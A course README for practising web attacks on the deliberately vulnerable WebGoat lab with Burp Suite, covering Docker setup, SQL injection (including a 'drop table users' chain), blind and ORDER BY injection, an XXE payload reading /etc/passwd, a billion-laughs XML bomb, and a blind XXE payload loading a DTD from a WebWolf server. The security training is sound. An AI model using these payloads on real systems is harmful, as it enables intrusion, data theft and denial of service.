# WebGoat / Burp Suite Course

## Start WebGoat

`docker run -p 8080:8080 -it webgoat/webgoat-8.0 /home/webgoat/start.sh`

OR run via the supplied docker-compose.yml file

`docker-compose up webgoat`

Then navigate to [http://localhost:8080/WebGoat](http://localhost:8080/WebGoat)

## Stop WebGoat

The container can be stopped this way (or with CMD+C)

`docker container stop <CONTAINER-ID>`

## Start WebGoat & WebWolf

Use our provided `docker-compose.yml` file for this and run:

`docker-compose up`

This should fire up WebGoat & WebWolf under the same bridged network.

## Environment Variables in Docker

You will notice an environment variable in the	`docker-compose.yml` file, for example `WEBWOLF_HOST`. This is needed because the containers will have their own unique names withing the bridged network created by Docker. The name is the same as the service name as defined in `docker-compose`.

The environment variables are set in the [`application.properties` file](https://github.com/WebGoat/WebGoat/blob/6c91e7dc8ab4d873cda8550a04b6179db048568b/webgoat-container/src/main/resources/application.properties) on container startup and any environment variables found are used to set these properties.

## SQL Injection (basic)

### Potential string injection

`"select * from users where name = '" + userName + "'";`

Example attack:

`Smith' or '1'='1` which resolves into `select * from users where name = 'Smith' or '1'='1'`

### Potential numeric injection

`"select * from users where employee_id = "  + userID;`

Example attack:

`1234567 or 1=1` which resolves into `select * from users where employee_id =1234567 or 1=1;`

## SQL Injection (advanced)

Ability to inject based on commenting syntaxt `/* */`, `#`,  `--` etc, exploting query chaining syntax namely `;` and string conactination `+`,`[]` etc.

```
/* */ 	 are inline comments
-- , # 	 are line comments

Example: Select * from users where name = 'admin' --and pass = 'pass'

;        allows query chaining

Example: Select * from users; drop table users;

',+,||	 allows string concatenation
Char()	 strings without quotes

Example: Select * from users where name = '+char(27) or 1=1
```

Example attack:

Here we use `;` to concat another statement and we use `--` to comment out the trailing quote (from the server side query)

`Smith'; select * from user_system_data; --`

## Blind SQL Injection

Uses boolean logic to determine database schema and dumping data.

The idea is to append basic boolean algebra to a form or url. 

Consider the URL: `https://my-shop.com?article=4`

Now add `AND 1=1` to the end of the url like this:

`https://my-shop.com?article=4 AND 1=1`

The page should still render as expected. 

If we change to `AND 1=2` (which equates to false) and we see that the page no longer renders we can be sure that the logic is being executed in the DBMS.

`https://my-shop.com?article=4 AND 1=2`

`https://my-shop.com?article=4 AND substring(database_version(),1,1) = 2`

Its all about guess work and can take a long time to extract all the information.

Here is an articule that runs through this in detail: 

Here is a script that will make this process easier: 

## ORDER BY SQLi Examples

A common approach for attach is via exploiting the ORDER BY clasue.

In the example below the parameter @col is replaced at run time with the actual column name.

`select * from users order by @col`

This means that the column name can be substituted with a boolean test for other parts of the database (basically another example of  Blind SQLi).

You can test for this by trying column numbers such as 1,2 etc. When you see the order change depending on this number then the query is vulnerable to attack.

Another good test is to change the order like so:

`1 DESC --`

You will see the order change of the results - that means you are in control - yay!

The way to exploit this is using a `case` statement where you substitute the boolean part of the statement with a condidition that you want to test. The ordering of the colunns will therefore tell you that your 'question' to the database is right or wrong.

For example the injectiuon statement would be:

`(case when (true) then hostname else id end)`

So in this example because we pass 'true' in the 'when' part the results will be ordered by the 'hostname' column.

Now we can subsitute the 'true' part with a valid SQL statement and test anything!

It will take time but we now just simply follow standard blind SQLi techniques.

## XXE Injection

Entities in XML can be freely defined and parsers will subsitute the values where the entities are found in the XML.

For example:

```
<?xml version="1.0" standalone="yes" ?>
<!DOCTYPE author [
  <!ELEMENT author (#PCDATA)>
  <!ENTITY js "Jo Smith">
]>
<author>&js;</author>
```

So everywhere you use the entity `&js;` the parser will replace it with the value defined in the entity (so in the above example 'Jo Smith').

So how could we exploit this? Answer is to use SYSTEM or [External Entitity Declarations](https://www.w3schools.com/xml/xml_dtd_entities.asp) and the [file URI scheme](https://en.wikipedia.org/wiki/File_URI_scheme)

For example, using file URI to get the passwords on a server would look like this: `file:///etc/passwd`.

If we create an External Entity in the XML and ask the parser to render that in the response XML we have a list of all passwords on the server!

For example, imagine in a commenting application there was a form field to add a comment. Then intercept that using Burp Suite (for example), and replace the XML with the following. If you then refresh the browser page you will see the output of the `/etc/passwd` file in the comments stream!

```
<?xml version="1.0"?>
<!DOCTYPE comment [  
<!ELEMENT text ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<comment><text>&xxe;</text></comment>
```

## XXE DDOS Classic 'XML Bomb' attack

The classic XML Bomb or a [billion laughs attack](https://en.wikipedia.org/wiki/Billion_laughs_attack) looks like this:

```
<?xml version="1.0"?>
<!DOCTYPE lolz [
 <!ENTITY lol "lol">
 <!ELEMENT lolz (#PCDATA)>
 <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
 <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
 <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
 <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
 <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
 <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
 <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
 <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```

When an XML parser loads this document, it sees that it includes one root element, "lolz", that contains the text "&lol9;". However, "&lol9;" is a defined entity that expands to a string containing ten "&lol8;" strings. Each "&lol8;" string is a defined entity that expands to ten "&lol7;" strings, and so on. After all the entity expansions have been processed, this small (< 1 KB) block of XML will actually contain 109 = a billion "lol"s, taking up almost 3 gigabytes of memory!

## Blind XXE 

Assuming we are running WebGoat and WebWolf using our `docker-compose` setup then we upload the [`webwolf/attack.dtd`](./webwolf/attack.dtd) file to WebWolf first and copy the link url.

Then in the comments hack example, use Burp Suite to intecept the request and repace with the follwoing XML payload (change the SYSTEM URL to your 'attack.dtd' URL from WebWolf).

This basically loads the remote DTD file and replaces the `%remote;` placeholder with the contents (the actual Entities) of the remote DTD. This is basically our 'attack.dtd' file which contains the entity 'ping'. We insert this into the text element of the XML so that the parser executes it thus sending a request to our WebWolf server from WebGoat!

```
<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://webwolf:8081/files/darren/attack.dtd">
%remote;
]>
<comment>
  <text>test&ping;</text>
</comment>
```

